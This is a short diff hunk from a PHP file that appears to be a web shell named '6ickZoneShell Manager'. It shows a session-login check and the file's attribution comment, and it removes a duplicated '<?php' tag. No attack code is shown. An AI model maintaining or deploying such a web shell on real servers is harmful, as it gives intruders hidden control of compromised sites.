@@ -70,8 +70,6 @@ if(empty($_SESSION['masuk'])) {
 exit();
 }
 ?>
-
-<?php
 <?php
 /**
  * 6ickZoneShell Manager by 0x6ick x Nyx6st | Copyright 2025 by 6ickwhispers@gmail.com
